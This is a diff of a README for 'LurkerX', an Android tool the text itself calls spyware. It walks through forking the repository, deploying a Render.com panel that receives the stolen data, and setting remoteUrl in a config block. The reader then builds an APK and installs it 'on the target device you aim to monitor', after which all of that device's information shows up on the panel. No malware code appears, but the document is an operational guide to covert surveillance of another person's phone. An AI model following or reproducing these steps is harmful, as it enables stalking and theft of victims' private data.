@@ -19,7 +19,7 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 
 3. Fork the repository, step-by-step illustration as shown in the images below:
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-1.PNG?raw=true?raw=true" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-1.PNG?raw=true?raw=true" width="300" height="400">
 
 4. Copy the link to your forked repository. For e.g, mine is https://github.com/nooby-jazy/LurkerX
 
@@ -29,20 +29,20 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 
 6. Create a new `web service`
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-2.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-2.PNG?raw=true" width="300" height="300">
 
 7. Choose public git repository and enter the link to your GitHub fork. 
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-3.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-3.PNG?raw=true" width="300" height="300">
 
 8. Connect and Choose `FREE` instance plan. Then jump to the bottom and click `Deploy web service`
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-4.PNG?raw=true" width="300" height="300">
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-5.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-4.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-5.PNG?raw=true" width="300" height="300">
 
 9. Render will generate a link for you. Copy the link
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-6.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-6.PNG?raw=true" width="300" height="300">
 
 10. Go back to your GitHub account. Everything is set, you just need to make sure your generated Spyware would forward all data and information to your Render.com URL. 
 
@@ -51,13 +51,13 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 - `remoteUrl` should be your link from render.com
 - `repo_url` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-9.PNG?raw=true" width="300" height="400">
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-10.PNG?raw=true" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-9.PNG?raw=true" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-10.PNG?raw=true" width="300" height="400">
 
 You edit this, you edit the spyware behavior.
 Don't forget to save it after editing(Also called "Committing" on GitHub)
 
-<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-12.PNG?raw=true" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.0-12.PNG?raw=true" width="300" height="400">
 
 This is an example of how I made mine:
 
@@ -93,22 +93,20 @@ from = base.apk
 repo_url= https://github.com/its-ernest/LurkerX
 
 [sign]
-keystore = mykey.jks
+keystore = test.jks
 keystore_pass = password
 alias =
 
 ```
 
-12. Now open your GitHub Actions, for e.g, mine is 
+12. After that restart your Panel. To do that, go back to your Render dashboard, select the web service you created, click on `Manual Deploy`. Wait for the deployment to complete successfully(if it shows green tick icon)
 
-`https://github.com/nooby-jayz/LurkerX/actions`
+13. Open the link Render generated for you. (The link ending in `.onrender.com`)
 
-13. Choose the latest one, the first one on top. 
+14. Open the panel and click on `BUILD APP (GITHUB CI)`
 
-14. Wait for it to build the malware successfully then scroll to the bottom (Artifacts section)
+15.  You should see the app built, click on it to download
 
-14.  You should see the app built, click on it to download
-
-13. After that install it on the target device you aim to monitor
+16. After that install it on the target device you aim to monitor
  
-14. All information on that device can also be viewed on your render.com URL portal. 
+17. All information on that device can also be viewed on your `onrender.com` URL portal. 
